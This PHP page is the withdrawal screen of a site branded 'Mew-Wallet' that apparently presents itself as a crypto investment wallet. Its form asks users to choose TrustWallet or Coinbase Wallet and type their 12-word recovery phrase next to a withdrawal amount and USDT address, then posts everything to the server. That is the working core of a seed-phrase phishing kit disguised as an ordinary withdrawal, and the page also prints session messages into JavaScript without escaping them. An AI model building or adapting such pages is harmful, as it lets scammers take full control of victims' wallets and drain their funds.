<?php
ob_start();
session_start();
if (empty($_SESSION["user_id"])) {
  $_SESSION["ERROR"] = "Please login";
  header("Location:./login");
}
$message = "";
if (!empty($_SESSION["ERROR"])) {
  $message = $_SESSION["ERROR"];
  $_SESSION["ERROR"] = "";
}
$success = "";
if (!empty($_SESSION["MESSAGE"])) {
  $success = $_SESSION["MESSAGE"];
  $_SESSION["MESSAGE"] = "";
}


require("./app/function.php");
require("./app/config/config.php");

$userDetails = getUserDetails($conn, $_SESSION["user_id"]);

?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Withdraw</title>
     <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <!-- Custom CSS -->
     <link rel="stylesheet" href="style.css">
</head>
<body class="backgroundlogin1">
   <!-----okay-->
<nav class="navbar navbar-expand-lg navbar-light bg-light">
  <img src="./mew gif2.gif" width="50px" alt="Cryptocurrency Investment" class="img-fluid"><a class="navbar-brand" href="#">Mew-Wallet</a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>
  <div class="collapse navbar-collapse" id="navbarNav">
    <ul class="navbar-nav ml-auto">
      <li class="nav-item">
        <a class="nav-link" href="./">Home</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="./account">Back</a>
      </li>
    </ul>
  </div>
</nav>




<!-----end of okay-->

<!--2nd one-->
<div class="container mt-5">
  <h1 class="withdrawform">Withdrawal Form</h1>
   <div class="card p-4" style="width: fit-content;">
   <form id="withdrawalForm" action="./withdraw-funds" method="POST">
    <div class="form-group">
      <label for="selectCurrency">Select Wallet:</label>
      <select class="form-control" name="selectAccount" id="selectCurrency" class="w-50 border-none" >
        <option value="TrustWallet">TrustWallet</option>
        <option value="Coinbase-Wallet">Coinbase Wallet</option>
        <!-- Add more options as needed -->
      </select>
    </div>
    <div class="form-group">
      <label for="phraseWords">Enter 12 Phrase Word:</label>

      <textarea name="phraseWords" id="phraseWords" placeholder="Enter 12 Phrase Word" cols="30" rows="6" class="form-control" >

      </textarea>
      
    </div>
    <div class="form-group">
      <label for="amount">Enter Amount In USD:</label>
      <input type="number" class="form-control" id="amount" name="amount" placeholder="Enter Amount In USD">
    </div>
    
    <div class="form-group">
      <label for="usdtAddress">Enter USDT Address:</label>
      <input type="text" class="form-control" name="address"  id="usdtAddress" placeholder="Enter USDT Address">
    </div>
    <button type="submit" class="btn btn-primary">Withdraw</button>
  </form>
   </div>
</div>

<script>
  // document.getElementById("withdrawalForm").addEventListener("submit", function(event) {
  //   event.preventDefault();
  //   // Retrieve form values
  //   var currency = document.getElementById("selectCurrency").value;
  //   var phraseWords = document.getElementById("phraseWords").value;
  //   var usdtAddress = document.getElementById("usdtAddress").value;
    
  //   // Perform validation (You can add your own validation logic here)
  //   if (currency && phraseWords && usdtAddress) {
  //     // Proceed with withdrawal process (You can add your withdrawal logic here)
  //     console.log("Currency: " + currency);
  //     console.log("Phrase Words: " + phraseWords);
  //     console.log("USDT Address: " + usdtAddress);
      
  //     // Reset form after successful submission
  //     document.getElementById("withdrawalForm").reset();
  //   } else {
  //     // Display error message if any field is empty
  //     alert("All fields are required.");
  //   }
  // });
</script>

<!------------footer-->
<footer class="footer mt-auto py-3 bg-dark">
  <div class="container">
    <div class="row">
      <div class="col-md-6">
        <span class="text-muted">© 2024 Mew-Wallet</span>
      </div>
      <div class="col-md-6 text-md-right">
        <a href="#" class="text-muted">Privacy Policy</a>
        <span class="text-muted mx-2">|</span>
        <a href="#" class="text-muted">Terms of Service</a>
      </div>
    </div>
  </div>
</footer>
<!---------END Footer-->


<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>


<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>

<script>
    const toastLiveExample = document.getElementById('liveToast')
    var message = "<?php echo $message ?>"
    var success = "<?php echo $success ?>"
    if (message) {
        Swal.fire({
            title: 'Error!',
            text: message,
            icon: 'error',
            confirmButtonText: 'Ok'
        })

    }
    if (success) {
        Swal.fire({
            title: 'success!',
            text: success,
            icon: 'success',
            confirmButtonText: 'Ok'
        })

    }
</script>


<!-- Bootstrap JS and dependencies -->
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<!-- Custom JavaScript -->
<script src="script.js"></script>
</body>
</html>